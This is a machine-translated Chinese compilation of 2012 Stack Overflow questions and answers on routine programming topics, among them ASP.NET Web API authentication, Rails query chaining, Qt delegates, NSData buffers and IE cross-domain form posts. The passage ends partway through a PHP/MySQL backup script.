它似乎应该在 Heroku 上运行，但可能需要进行一些更改。您不需要使用 SSL 运行 Tomcat，因为 Heroku 在 Tomcat 应用程序前面提供了 HTTPS。您可能必须更新 Maven 构建以[通过 webapp-runner 拉入 Tomcat](https://devcenter.heroku.com/articles/java-webapp-runner)。属性文件可能应该替换为[Config Vars](https://devcenter.heroku.com/articles/config-vars)。唯一看起来可能很棘手的部分是 Metro 部分。目前尚不清楚 Metro 是如何被拉入系统并使用的。

# asp.net-web-api - ASP.NET Web API 和授权

> ID：11820179
> 
> 赞同：3
> 
> 时间：2012-08-05T21:21:57.600
> 
> 标签：asp.net-web-api

所以我有一个现有的 Windows Phone 7 应用程序，它使用我自己的授权（玩家使用别名和密码登录，并根据数据库验证它）去 MVC Web 服务。

现在我希望转向 ASP.NET Web API，但我有点困惑如何为其添加安全性？

我看到有`AuthorizeAttribute`，但我需要做什么才能让他们获得授权？

这里的任何指导将不胜感激。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-06T05:10:45.270

`AuthorizeAttribute`只是检查`Thread.CurrentPrincipal`用户是否有权访问指定的资源（在这种情况下是控制器操作）。它不提供任何类型的身份验证机制。

在您的情况下，由于您有用户名和密码，您可以进行基本身份验证。执行此操作的最佳位置是在消息处理程序中。这是一个示例：[BasicAuthenticationHandler](https://github.com/WebAPIDoodle/WebAPIDoodle/blob/master/src/apps/WebAPIDoodle.Http/Handlers/BasicAuthenticationHandler.cs)

我不鼓励您按原样使用它，因为此实现背后没有测试，但这应该给您一个想法。该类是一个抽象类，当您将其设置为消息处理程序的基类时，您需要覆盖该`AuthenticateUser`方法并返回`IPrincipal`。如果返回值为 null，则表示用户未通过身份验证。如果您提供一个`IPrincipal`，`IPrincipal`它将被设置并且您`AuthorizeAttribute`可以检查它。

例如，您可以使用[GenericPrincipal](http://msdn.microsoft.com/en-us/library/system.security.principal.genericprincipal.genericprincipal)类创建一个`IPrincipal`. 假设您在 ASP.NET 主机上，您可以注册您的身份验证处理程序，如下所示：

```
GlobalConfiguration.Configuration.MessageHandlers.Add(new MyAuthHandler()); 
```

总而言之，无论您使用什么类型的身份验证（基本身份验证、OAuth 等），都以某种方式通过消息处理程序进行身份验证。然后，通过 进行授权`AuthorizeAttribute`。

> 此外，Dominick Baier 有一个关于[保护 ASP.NET Web API](http://vimeo.com/43603474)的精彩演示，我建议您检查一下。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-04-19T14:47:06.063

maybe this will help you: [Custom AuthorizeAttribute for Web API controllers](http://freecodebase.com/Home/Article?articleId=1)

# ruby-on-rails - 基于参数的动态 ActiveRecord 查找器方法链接

> ID：11820182
> 
> 赞同：3
> 
> 时间：2012-08-05T21:22:38.860
> 
> 标签：ruby-on-rails, ruby, activerecord, rails-activerecord

我是 Rails 新手，我想根据不同的 GET 参数（过滤和排序）进行选择查询。我可以添加一些条件以在代码中查找吗？

例如：

```
if params[:ratings] 
  Movie.where(:rating => params[:ratings].keys)
end 
```

然后添加 ordering 和其他 where 条件。我怎样才能做到这一点？也许有更好的方法来动态修改选择查询（不制作 SQL 字符串）。谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-05T21:49:30.197

, `where`, `order`... 方法返回 ActiveRecord::Relation 对象，因此您可以继续调用更多查询方法：

```
query = Movie
if(params[:ratings])
  query = query.where(:rating => params[:ratings].keys)
end
if(params[:some_order_param])
  query = query.order(params[:some_order_param])
end
# Keep adding more 'where', 'order', 'group', ... methods as needed ...
results = query.all 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-05T22:02:13.990

对于这种类型的行为，我实际上会推荐[has_scope gem 。](https://github.com/plataformatec/has_scope)它允许您在模型上定义范围和类方法，并自动将它们用于控制器中的过滤、排序等。

这是文档中的一个小示例，但您可以使用它做很多事情：

```
class Graduation < ActiveRecord::Base
  scope :featured, where(:featured => true)
end

class GraduationsController < ApplicationController
  has_scope :featured, :type => :boolean
end 
```

# google-apps-script - 在 Google Apps 脚本中使用完整的 Google Maps V3 API 及其所有功能

> ID：11820188
> 
> 赞同：3
> 
> 时间：2012-08-05T21:23:17.867
> 
> 标签：google-apps-script

我想将我的 Google Maps V3 Web Apps 转换为 Google Apps Script。如何将完整的 Maps V3 API 使用/加载到 Google Apps 脚本 HTML 文件（GAS Web 应用程序）中？正常的标记方法似乎不起作用。

我也试过谷歌加载器，但没有成功。

即使是 URLFetch，但到目前为止还没有运气。

这适用于作为 Web 应用程序发布的“独立脚本”。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2015-01-04T13:40:23.100

[自 2014 年 12 月](https://developers.google.com/apps-script/releases/#december_2014)起，可以使用Google Apps Script HtmlService 中的[IFRAME 沙盒模式](https://developers.google.com/apps-script/reference/html/sandbox-mode)使用 Google Maps JavaScript API v3 。将以下代码段发布为 Web 应用程序并在 Google Developer Console 中生成一个公钥，允许`*.googleusercontent.com/*`作为浏览器引用者：

```
function doGet() {
  return HtmlService.createHtmlOutputFromFile('ui')
                    .setSandboxMode(HtmlService.SandboxMode.IFRAME);
} 
```

-- ui.html -- (来自[Google Maps Dev. Docs](https://developers.google.com/maps/documentation/javascript/tutorial) )

```
<!DOCTYPE html>
<html>
  <head>
    <style type="text/css">
      html, body, #map-canvas { height: 100%; margin: 0; padding: 0;}
    </style>
    <script type="text/javascript"
      src="https://maps.googleapis.com/maps/api/js?key=API_KEY">
    </script>
    <script type="text/javascript">
      function initialize() {
        var mapOptions = {
          center: { lat: -34.397, lng: 150.644},
          zoom: 8
        };
        var map = new google.maps.Map(document.getElementById('map-canvas'),
            mapOptions);
      }
      google.maps.event.addDomListener(window, 'load', initialize);
    </script>
  </head>
  <body>
<div id="map-canvas"></div>
  </body>
</html> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-06T13:05:41.583

加载器还不能在 HtmlService 中工作。

# windows - Windows Batch：使用 SET 命令更改文件路径的一部分

> ID：11820198
> 
> 赞同：0
> 
> 时间：2012-08-05T21:24:56.160
> 
> 标签：windows, batch-file, replace, command, set

我想执行一个程序来操作文件夹及其子文件夹中的所有图像，并将这些图像保存在另一个目录中，但在相同的子文件夹结构中。为此，我需要获取原始图像和处理后图像的完整路径。

但是我根本无法获取 SET 命令来转换目录名称。这是我所做的：

```
set originalpath=g:\Users\PLAY\Documents\backuppgm\images
set convertpath=g:\Users\PLAY\Documents\backuppgm\resized
for /R %originalpath% %%G in (*.jpg) DO (
echo %%G
SET fullpath=%%G
SET modified=!fullpath:%originalpath%=%convertpath%!
echo Full: %fullpath%
echo Modified: %modified% 
```

这个想法是 fullpath 将等于 %originalpath%\subfolder\image1.jpg 并且修改后将等于 %convertpath%\subfolder\image1.jpg 然后我可以在这两个项目上运行我的批处理......但是那套修改后的命令根本不起作用...

简单地说，我想将字符串 %originalpath%\subfolder\image1.jpg 转换为 %convertpath%\subfolder\image1.jpg

谢谢，

布莱斯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-05T22:56:11.427

There is two issues.

1) Example of working batch (e.g. "test.cmd")

```
@echo off
cls
set originalpath=g:\Users\PLAY\Documents\backuppgm\images
set convertpath=g:\Users\PLAY\Documents\backuppgm\resized
for /R %originalpath% %%G in (*.jpg) DO call :cvt "%%G"
goto :EOF
:cvt
echo "%~1"
SET fullpath=%~1
SET modified=!fullpath:%originalpath%=%convertpath%!
echo Full: %fullpath%
echo Modified: %modified%
goto :EOF 
```

2) You **must** call it with `/V:ON`

```
cmd /V:ON /c test.cmd 
```

# javascript - Google Maps API v3 - API 脚本压缩/混淆

> ID：11820204
> 
> 赞同：1
> 
> 时间：2012-08-05T21:25:42.953
> 
> 标签：javascript, google-maps, google-maps-api-3, compression, obfuscation

我最近在 v3 上做了很多工作，如果您注意到，除了在脚本上进行的常规压缩（局部变量重命名、空格删除等）之外，API 脚本在此基础上向前推进，并且还有类和他们的方法用 2 个字符名称重命名。我还注意到其他“奇怪”的事情，例如向 API 用户公开的名称被存储为变量并在脚本中使用。在我看来，我认为还有某种混淆意图。

不知道我是否说清楚了，或者这是否是某种我没有做对的压缩，但我想你明白了。

如果有人知道这是否类似于以这种方式压缩脚本的公共实用程序，或者是否有人可以指出一些可能有帮助的参考资料，我很感兴趣。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-06T00:01:57.823

我认为 Google 使用了他们的 Closure Compiler——它完成了你所描述的大部分工作。
[谷歌闭包编译器](https://developers.google.com/closure/compiler/)

CC 比 yui-compressor 或 jsmin 等其他工具更雄心勃勃（也更有价值）

# java - 如何不为特定的 url 模式运行 servlet 过滤器？

> ID：11820207
> 
> 赞同：0
> 
> 时间：2012-08-05T21:26:08.437
> 
> 标签：java, tomcat, servlets, servlet-filters, web.xml

我想创建一个 servlet 过滤器，它适用于我的所有 URL 路径，除了一些指定（或理想情况下由正则表达式指定）。

那可能吗？不幸的是，我无法更改路径，以使我所有其他 URL 都以常见的开头....

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T22:09:38.873

您不能通过符合规范的配置来做到这一点。你有几个选择：

1.  重新编写您`<filter-mapping>`的 s 以使它们更加具体（例如，`/foo`变为但不是）。`/foo/bar``/foo/baz``/foo/foo`
2.  更改过滤器中的代码，使其了解“排除”URI 模式的列表。`<init-param>`如果您想在 中配置它们，您甚至可以使用它们`web.xml`，但您必须自己完成真正的工作。
3.  添加一组共享公共 URI 前缀的`<filter-mapping>`s 和`<servlet-mapping>`s*并开始使用**它们*（保留旧映射有效）。

# c# - 是否可以在 C# 中同时加载具有相同 GUID/CLSID 的两个不同的 ole com 库

> ID：11820209
> 
> 赞同：0
> 
> 时间：2012-08-05T21:26:50.720
> 
> 标签：c#, dll, com, ole

我有三个供应商提供的 ole com 库，它们为不同但相似的设备提供接口。这些库在设备之间不兼容，并且嵌入了不同的功能。它们也都共享相同的 ID，所以我一次只能在一台机器上注册一个。不幸的是，我没有源代码，也无法重新编译它们。

我的问题是，我经常需要能够与不止一种型号的设备进行通信。

我尝试从特定路径加载 dll 并将其转换为程序集，创建它的实例并为我需要的函数提取方法信息。这似乎有效。正如预期的那样，不同库的类型信息是不同的，但是每当我实例化它时，它似乎仍然只加载注册的 dll，因为如果我调用不在当前注册的 dll 中的函数，它会崩溃并因访问冲突而烧毁。有没有人有任何想法？

```
[DllImport("oleaut32.dll", CharSet = CharSet.Unicode, PreserveSig = false)]
public static extern void LoadTypeLibEx(String strTypeLibName, RegKind regKind, [MarshalAs(UnmanagedType.Interface)] out Object typeLib);

public enum RegKind
{
  RegKind_Default = 0,
  RegKind_Register = 1,
  RegKind_None = 2
}

private void Initialize() {

  Type ct;
  object typeLib;

  try {
    // Load DLL
    LoadTypeLibEx(@"c:\temp\zkA11C\zkemkeeper.dll", RegKind.RegKind_None, out typeLib);

    if (typeLib == null)
      throw new Exception("LoadTypeLibEx returned null pointer");

    TypeLibConverter converter = new TypeLibConverter();
    ConversionEventHandler eventHandler = new ConversionEventHandler();
    AssemblyBuilder zkA11C = converter.ConvertTypeLibToAssembly(typeLib, "zkA11C.dll", 0, eventHandler, null, null, null, null);

    // Get class type
    ct = zkA11C.GetType("zkA11C.CZKEMClass");

    // Create instance of the class
    dllClassInstance = Activator.CreateInstance(ct);

    // Get method info for functions
    fmiConnect = ct.GetMethod("Connect_Net");
    ...
  }
  catch (Exception e) {
    throw new Exception("Failed to load library: " + e.Message);
  }
} 
```

# c# - 读取具有正确编码的固定字符数组

> ID：11820211
> 
> 赞同：3
> 
> 时间：2012-08-05T21:26:56.260
> 
> 标签：c#, encoding, struct, unsafe

我正在尝试为无限引擎创建的游戏（Baldur's gate、planescape Torment 等）开发一个改装工具。我知道 Infinity Engine 文件中有哪些类型的数据结构，我正在从 byte[] 内容映射一些对象。然而，它缺乏一些性能，我对此并不满意。

我在托管世界上的映射对象是结构，我知道它们代表了多少字节。因此我决定在不安全的代码中进行映射过程。我对 Uint、ushort 之类的值类型值没有任何问题，但是在字符串类型中我遇到了 char[] 编码问题。

例如，您可以在 c# 中看到 struct gam 文件的 Header，

[http://iesdp.gibberlings3.net/file_formats/ie_formats/gam_v2.0.htm](http://iesdp.gibberlings3.net/file_formats/ie_formats/gam_v2.0.htm)

```
[StructLayout(LayoutKind.Explicit, Size = 180,CharSet = CharSet.Ansi)]
public unsafe struct Header
{
    [FieldOffset(0)] 
    public fixed char Signature[4];

    [FieldOffset(0x0004)]
    public fixed char Version[4];

    [FieldOffset(0x0008)] public uint GameTime;

    [FieldOffset(0x000c)] public ushort SelectedFormation;

    [FieldOffset(0x000e)] public ushort FormationButton1;

    [FieldOffset(0x0010)] public ushort FormationButton2;

    [FieldOffset(0x0012)] public ushort FormationButton3;

    [FieldOffset(0x0014)] public ushort FormationButton4;

    [FieldOffset(0x0016)] public ushort FormationButton5;

    [FieldOffset(0x0018)] public uint PartyGold;

    [FieldOffset(0x001c)] public ushort NpcStructCountForPartyEx;

    [FieldOffset(0x001e)] public ushort WeatherBitfield;

    [FieldOffset(0x0020)] public uint NpcStructOffsetForParty;

    [FieldOffset(0x0024)] public uint NpcStructCountForPartyInc;

    [FieldOffset(0x0028)] public uint Unknown1;

    [FieldOffset(0x002c)] public uint Unknown2;

    [FieldOffset(0x0030)] public uint NpcStructOffsetForNonParty;

    [FieldOffset(0x0034)] public uint NpcStructCountForNonParty;

    [FieldOffset(0x0038)] public uint GlobalNamespaceVarOffset;

    [FieldOffset(0x003c)] public uint GlobalNamespaceVarCount;

    [FieldOffset(0x0040)] public fixed char MainArea[8];

    [FieldOffset(0x0048)] public uint FamilarExtraOffset;

    [FieldOffset(0x004c)] public uint JournalEntriesCount;

    [FieldOffset(0x0050)] public uint JournalEntriesOffset;

    [FieldOffset(0x0054)] public uint PartyReputation;

    [FieldOffset(0x0058)] public fixed char CurrentArea [8];

    [FieldOffset(0x0060)] public uint GuiFlags;

    [FieldOffset(0x0064)] public uint LoadingProgress;

    [FieldOffset(0x0068)] public uint FamilarInfoOffset;

    [FieldOffset(0x006c)] public uint StoredLocOffset;

    [FieldOffset(0x0070)] public uint StoredLocCount;

    [FieldOffset(0x0074)] public uint GameTimeSec;

    [FieldOffset(0x0078)] public uint PocketPlaneOffset;

    [FieldOffset(0x007c)] public uint PocketPlaneCount;

    [FieldOffset(0x0080)] public fixed byte Unknown3 [52];
} 
```

这就是映射 this 对象的方式；

```
 string path = @"C:\Baldur.gam";

        byte[] content = IoHelper.ReadBinaryFile(path);

        unsafe
        {
            fixed (byte* pointContent = content)
            {
                Header* header = (Header*) pointContent; 
            }
        } 
```

这是我拥有的 char 签名的结果；

[0] = 21057 '剁' [1] = 13624 '㔸'

这些字符真的不合理。我猜这是由编码引起的。有谁知道这个的解决方案？或者我是否必须自己读取带有 Encoding.ASCII.GetString 的字符数组？如果我用这种方法读取一个特定大小的字节 []，我会得到真正的结果。

这些结构也有不同的版本。作为上面示例中的示例，有一个 V.2.0 版本的 Baldur's Gate 2 Gam 文件。然而，在 Baldur's Gate 1 中，版本更改为 v.1.0，这不适用于我的方法。我想阅读这些不同的方法并将它们映射到模型中，然后将它们发送回 UI 层。你对阅读不同类型的版本有什么建议吗？

提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-06T18:42:50.637

我解决了我的问题。

我问过的人说；

*“在 .net 中，字符长 2 个字节。如果直接投射，则无法执行此操作。为此，您可以使用 Marshall 类 PtrToStructureMethod”*

我将固定字节成员替换为字符串并使用 MarshalAs 属性，例如；

```
 [FieldOffset(0x0004), MarshalAs(UnmanagedType.ByValTStr, SizeConst = 4)]
    public string Version; 
```

并将我的映射代码替换为；

```
 string path = @"G:\Games\BGOrg\BGII - SoA\save\000000001-Quick-Save\Baldur.gam";

        byte[] content = IoHelper.ReadBinaryFile(path);

        IntPtr unmanagedPointer = Marshal.AllocHGlobal(content.Length);
        Marshal.Copy(content, 0, unmanagedPointer, content.Length);

        Header header = (Header) Marshal.PtrToStructure(unmanagedPointer, typeof (Header)); 
```

奇迹般有效 ：）

问候。

# qt - 如何从 QAbstractItemDelegate 访问 QListWidget 或 QListWidgetItem

> ID：11820212
> 
> 赞同：1
> 
> 时间：2012-08-05T21:27:00.127
> 
> 标签：qt, list, delegates, paint, qlistwidget

这在Qt中甚至可能吗？我有一个带有特定绘画委托的 QListWidget 设置，并且我试图根据 QListWidget 父级中的变量来不同地绘制委托。我想只要我有一个指向任何一个的指针，我就可以装配一些东西，但我需要在代表的paint() 中以某种方式得到它们。

我已经尝试过“hack”将指针存储在 QVariant 中，但它似乎不起作用，我宁愿不采用这种方法。如果我可以得到指向委托所代表的项目的指针，并且只需调用 item->listWidget()，这将是完美的，但在委托内部似乎不可能。

有什么解决方法可以做到这一点吗？

另外，只是因为.. 尝试使 void* 技巧起作用的示例-如果这是做到这一点的唯一方法，也许有人可能会看到我在其中有什么问题。

```
//Parent of QListWidget
....
QListWidgetItem *item = new QListWidgetItem();
....
QVariant v = qVariantFromValue((void *) pStitchSymbolCustom);
item->setData(Qt::UserRole + 6, v);
....

//Implemented QAbstractItemDelegate
....
MyClass* p_pointer = 
    (MyClass*)(index.data(Qt::UserRole + 6).value<void *>()); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T21:47:05.400

我不确定，如果我正确理解了您的问题，但是如果您想访问包含您的委托的 QListWidget，那么我认为，最简单的方法是将委托的父级设置为列表小部件，然后获取listwidget 在委托的任何点：

```
QAbstractItemDelegate * delegate = new MyItemDelegate(myListWidget);

myListWidget.setItemDelegate(delegate); 
```

然后在委托代码中：

```
QListWidget * listWidget = qobject_cast<QListWidget*>(parent());

//You can do whatever you want your list here 
```

如果您的对象树很深，并且您希望代码是通用的并且不关心所需的父级在哪里，您应该自动提升树：

```
QListWidget * listWidget = 0;
QObject * object = parent();
while (object && ! listWidget) {
    // qobject_cast will succeed once the parent of the correct type is reached
    listWidget = qobject_cast<QListWidget*>(object);
    object = object->parent();
} 
```

# c++ - 在 C++ 中处理 Winsock 错误的推荐方法是什么？

> ID：11820214
> 
> 赞同：1
> 
> 时间：2012-08-05T21:27:19.410
> 
> 标签：c++, stl, winsock

在 C++ 中处理 Winsock 错误的推荐方法是什么？

> 检查您在应用程序中调用的每个 Winsock 函数的返回码？

或者

> 通过异常处理来处理错误（类似于 SocketException : public std::exception）？

或者

> 两个都？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-05T21:30:52.140

由于 Winsock 本身不会抛出异常，因此处理错误的*唯一*方法是检查您调用的函数的返回码。

如果您在 Winsock 之上编写自己的层来引发您自己的异常，那么您的应用程序代码可以响应异常。但这取决于你。

# php - 消除表数据之间的空间

> ID：11820215
> 
> 赞同：0
> 
> 时间：2012-08-05T21:27:21.480
> 
> 标签：php, css, html-table

我试图摆脱单元格之间的边界空间。我认为单元格间距可以解决问题，但仍然有一个细长的白色边框。谁能给我一些建议...

```
<body>
<center><table style="cellspacing:0; width:400px; border:none;">
<?
echo "<tr><td> Team </td><td>Correct Picks</td><td>Points</td></tr>";
while($row = mysql_fetch_array($memberslist)) {
    if ($row['User_ID'] == $id) {
        echo "<tr bgcolor=\"gray\"><td>" . $row['User_ID'] . "</td><td><b>" . $row['Correct_Picks'] . " </b> /" . $maxcorrectpicks . "</td><td>" . $row['Points'] . "</td></tr>";
    } else {
        echo "<tr><td>" . $row['User_ID'] . "</td><td><b>" . $row['Correct_Picks'] . " </b> /" . $maxcorrectpicks . "</td><td>" . $row['Points'] . "</td></tr>";
}
}
?>
</table></center>

</body> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-05T21:30:21.063

```
cellspacing=0; 
```

没有CSS。这曾经是一个 HTML 属性：

```
<table cellspacing="0" style="width:400px"> 
```

另请参阅相关（重复？）问题：

*   [如何在 CSS 中设置单元格填充和单元格间距？](https://stackoverflow.com/questions/339923/how-to-set-cellpadding-cellspacing-in-css)

# ios - 将 uint8_t 转换为 NSData

> ID：11820217
> 
> 赞同：2
> 
> 时间：2012-08-05T21:27:59.917
> 
> 标签：ios, rsa, nsdata, bytebuffer

我已经根据 Apple Developer 网站上提供的示例在 iOS 应用程序中实现了公钥私钥 RSA 加密。

如果我加密并返回`uint8_t cipherBuffer`，然后从`uint8_t cipherBuffer`. 但是我需要将加密的数据存储到`.xcdata`模型中`NSData`。

我遇到的问题是在解密时可靠地`uint8_t cipherBuffer`转换`NSData`和/或转换`NSData`回。`uint8_t`解密的数据似乎被截断。

这就是我将`uint8_t`加密缓冲区转换为`NSData`：

```
return [NSData dataWithBytesNoCopy:cipherBuffer length:BUFFER_SIZE]; 
```

这就是我在解密时将加密转换`NSData`回缓冲区的方式：`uint8_t`

```
uint8_t *cipherBuffer = (uint8_t*)[cipherText bytes]; 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-05T21:34:33.250

如果不了解您的创作方式`cipherBuffer`，就很难确切地说出它为什么不起作用。但是，从文档中`dataWithBytesNoCopy`：

> 返回的对象获取字节指针的所有权并在释放时释放它。因此，字节必须指向使用 malloc 分配的内存块。

如果您只是将 cipherBuffer 声明为

```
uint8_t cipherBuffer[BUFFER_SIZE]; 
```

它可以解释你的问题。相反，使用**`malloc`**：

```
uint8_t* cipherBuffer = malloc(BUFFER_SIZE); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-07T23:05:38.287

感谢 jgh 和乔迪；

我将加密方法更改为“malloc”缓冲区并尝试了几种将字节写入的方法`NSData`，最终得到：

```
return [NSData dataWithBytes:(const void *)cipherBuffer length:CIPHER_BUFFER_SIZE]; 
```

最终解决这个问题的是改变我`uint8_t`在解密方法中创建的方式：

```
const uint8_t *cipherBuffer = (const uint8_t*)[data bytes]; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-05T21:35:57.713

听起来您正在给它一个原始指针，然后重新使用该指针。

`dataWithBytesNoCopy:`想要保留你给它的指针。事实上，你必须给它一个你用创建的指针`malloc`，因为当它处理完数据时它会释放它。

如果您不希望`NSData`对象获得所有权，则应使用**`dataWithBytesNoCopy:length:freeWhenDone:`**.

# c# - 用 IE 提交表单问题

> ID：11820224
> 
> 赞同：0
> 
> 时间：2012-08-05T21:29:48.000
> 
> 标签：c#, asp.net-mvc-3, cross-domain

我有一个包含多个字段但作为此标题必不可少的表单：

```
<form action="http://api.domain_A.com/43bdb030-e1e4-4526-86e5-5b8ba98aa117/Form/Challenge" 
      method="post" 
      id="frm-challenge"
      accept-charset="utf-8" 
      enctype="application/x-www-form-urlencoded"> ... </form> 
```

我正在提交：

```
var form = $(this).closest("form"),
    url = $(form).attr("action"),
    formdata = $(form).serialize();

if ($.browser.msie && window.XDomainRequest) {

    formdata = encodeURI(formdata);

    var xdr = new XDomainRequest();
    xdr.onload = submitAnswerDone;
    xdr.onerror = submitAnswerDone;
    xdr.open("POST", url);
    xdr.send(formdata);
}
else {
    $.support.cors = true;

    $.ajax({
        type: 'POST',
        url: url,
        data: formdata,
        success: submitAnswerDone,
        error: function (xhr, ajaxOptions, thrownError) {
            //console.log('result: Error ' + xhr.status);
            //console.log(thrownError);
        }
    });
} 
```

**表单**托管于，`http://{client_name}.domain-A.com/`表单提交至`http://api.domain-A.com/`。

在服务器端，我有一个获取表单的**ASP.NET MVC 3网站。**

控制器动作如下所示：

```
[HttpPost]
public JsonResult Challenge(FormCollection form)
{
    // u = Calendar GUID
    // c = Challenge GUID
    // s = Subscriber GUID
    // a = Answer GUID

    // flash = Flash
    // screen = Screen

    StringBuilder data = new StringBuilder();

    foreach (string f in form)
        data.AppendFormat("Name: >{0}< Value: >{1}< |\n", f, form[f]);

    // ### LOG EVENT ###############################################
    try
    {

        Loggr.Events.Create()
            .Text("Challenge test [u]")
            .Source(Request.UrlReferrer != null ? Request.UrlReferrer.ToString() : Request.Url.ToString())
            .Data("Form: >{0}<\n, Request: >{1}<", form["u"], Request["u"])
            .AddData(data.ToString())
            .AddData("Browser: {0}", Request.ServerVariables["HTTP_USER_AGENT"])
            .Post();
    }
    catch (Exception ex)
    {
        Loggr.Events.Create()
            .Text("Error: Challenge test [u]")
            .Source(Request.UrlReferrer != null ? Request.UrlReferrer.ToString() : Request.Url.ToString())
            .Data(ex.Message)
            .AddData(data.ToString())
            .AddData("Browser: {0}", Request.ServerVariables["HTTP_USER_AGENT"])
            .Post();
    }

    // ### SAVE EVENT ###############################################
    SecondaryDb db = new SecondaryDb();
    try
    {
        string c, u, s, a, fl, sc;

        c = form["c"] ?? "";
        u = form["u"] ?? "";
        s = form["s"] ?? "";
        a = form["a"] ?? "";
        fl = form["flash"] ?? "";
        sc = form["screen"] ?? "";

        string ip = Request.ServerVariables["HTTP_X_FORWARDED_FOR"],
                browser = Request.ServerVariables["HTTP_USER_AGENT"];

        if (string.IsNullOrWhiteSpace(ip))
            ip = Request.ServerVariables["REMOTE_ADDR"];

        db.AddSubscriberAnswerTest(u, c, a, s, browser, ip, fl, sc);

        string fields = String.Format("s:{0} c:{1} u:{2} a:{3}", s, c, u, a);

        return Json(new ApiResult() { ErrorCode = 0, Message = "Answer added (" + fields + ")" }, JsonRequestBehavior.DenyGet);

    }
    catch (Exception ex)
    {
        if (ex.InnerException != null)
            while (ex.InnerException != null)
                ex = ex.InnerException;

        StringBuilder fields = new StringBuilder();
        foreach (var f in form.AllKeys)
        {
            fields.AppendFormat("{0}:{1} | ", f, form[f]);
        }

        db.AddErrorTest(ex.Message, ex.StackTrace, fields.ToString().TrimEnd(' '));

        return Json(new ApiResult() { ErrorCode = 99, Message = ex.Message }, JsonRequestBehavior.DenyGet);
    }
} 
```

问题是，在所有浏览器中我都能正确获取所有内容，但在任何**Internet Explorer**提交中都没有（7、8 或 9）

我启动了**Fiddler**，我可以看到表单已发送：

```
POST http://api.domain_A.com/43bdb030-e1e4-4526-86e5-5b8ba98aa117/Form/ChallengeTest HTTP/1.1
Accept: */*
Origin: http://preview.domain_A.com
Accept-Language: da-DK
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
Host: api.domain_A.com
Content-Length: 239
Connection: Keep-Alive
Pragma: no-cache

u=43bdb030-e1e4-4526-86e5-5b8ba98aa117&c=f83c28d0-112a-4a88-986f-bcae8b30113b&s=&testmode=true&cType=1&flash=Flash%253A+WIN+11%252C3%252C300%252C270&screen=Screen%253A+1920x1040+(24+bits)&preview=True&a=bc3eb9cc-29a2-43e9-b507-a39a417f53aa 
```

我从中得到答案

```
HTTP/1.1 200 OK
Server: nginx
Date: Sun, 05 Aug 2012 21:12:43 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 78
Connection: keep-alive
Cache-Control: private
Access-Control-Allow-Methods: POST, GET, OPTIONS
Access-Control-Allow-Origin: *
X-UA-Compatible: IE=Edge,chrome=1
P3P: policyref="/w3c/p3p.xml", CP="IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT"

{"ErrorCode":0,"Message":"Answer added (s: c: u: a:)","Fields":"","Data":null} 
```

并查看保存的 Loggr 事件，我得到了 empty `form["u"]`，换句话说，我`FormCollection`的是空的！

**我究竟做错了什么？**

跨域协议已经到位，您可以通过 Fiddler Header 输出检查，我已经`crossdomain.xml`到位

```
<?xml version="1.0"?>
<!DOCTYPE cross-domain-policy SYSTEM
"http://www.adobe.com/xml/dtds/cross-domain-policy.dtd">

<cross-domain-policy>
    <site-control permitted-cross-domain-policies="all"/>
    <allow-access-from domain="*" secure="false"/>
    <allow-http-request-headers-from domain="*" headers="*" secure="false"/>
</cross-domain-policy> 
```

* * *

**添加**

如果我从

```
[HttpPost]
public JsonResult Challenge(FormCollection form) 
```

至

```
[HttpPost]
public JsonResult Challenge(
     string u, string c, string s, string a, string flash, string screen) 
```

我仍然将所有值都清空！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-06T11:23:38.947

尝试通过 Request 进入 Form 属性

`Request.Form["u"]`

# inno-setup - 我需要在 Inno Setup 中获取当前日期的 weekofyear

> ID：11820225
> 
> 赞同：1
> 
> 时间：2012-08-05T21:29:53.443
> 
> 标签：inno-setup

我相信我已经尽职尽责地试图找到这个问题的答案。你如何在 Inno Setup 中获得 weekofyear？任何帮助或建议将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-06T03:31:24.510

WeekOfYear 不是 InnoSetup 中支持的函数。源代码中没有对它的引用。您将需要编写自己的实现。虽然这篇[文章](https://stackoverflow.com/questions/274861/how-do-i-calculate-the-week-number-given-a-date)面向 C++，但它有一个伪代码算法，您可以使用它在 Inno Pascal 脚本中实现它。

# php - MySQL插入多个数据库 - 发出整个代码

> ID：11820229
> 
> 赞同：2
> 
> 时间：2012-08-05T21:30:30.893
> 
> 标签：php, mysql, mysql-backup

我不想说太多，这是我的代码（我知道它不是 PDO，但一旦它可以工作它就会）。几乎所有工作！

现在我正在做日志，我被卡住了！- 感谢迈克尔的更新，其中一些已修复！

```
$statresult=mysql_query($statsql, $actconn) or die(mysql_error()); 
```

**也优化功能。出于某种原因，这不适用于 Multiple DB...**

许可不想正确我已经看了几个小时，但我无法弄清楚。一切都很好地工作的一部分。

该代码从真实数据库中读取一些行并将它们移动到备份数据库。但我想要一个 cron 作业和电子邮件警报，所以我做了一个简单的日志（到表中），但它不想工作......我什至看不到任何错误日志。那么：PHP 警告：mysql_query()：提供的参数不是第 34 行 /home/sites/stcticketing.org/public_html/back/asu1.php 中的有效 MySQL-Link 资源

```
<?php
// open db
$dbhost = 'localhost';
$actdbuser = 'user1';
$actdbpass = 'pass';

$bckdbuser = 'user2';
$bckdbpass = 'pass';

